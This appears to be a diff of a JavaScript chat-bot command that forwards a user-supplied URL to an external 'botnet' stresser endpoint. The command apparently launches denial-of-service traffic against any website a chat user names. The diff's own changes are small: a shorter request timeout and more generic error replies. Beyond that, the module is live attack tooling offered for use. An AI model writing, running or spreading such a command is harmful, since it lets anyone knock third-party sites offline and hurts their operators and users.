@@ -26,7 +26,7 @@ module.exports["run"] = async ({ args, chat, font }) => {
 
     try {
         const response = await axios.get(`https://haji-mix-botnet.onrender.com/stresser?url=${encodeURIComponent(url)}`, {
-            timeout: 60000
+            timeout: 30000
         });
 
         initiate.unsend();
@@ -55,8 +55,8 @@ module.exports["run"] = async ({ args, chat, font }) => {
     } catch (err) {
         if (err.code === 'ECONNABORTED') {
             chat.reply(thin(status_msg));
-        } else if (err.response) {
-            chat.reply(thin(err.response.data.error));
+        } else if (err) {
+            chat.reply(thin(status_msg));
         } else {
             chat.reply(thin(status_msg));
         }
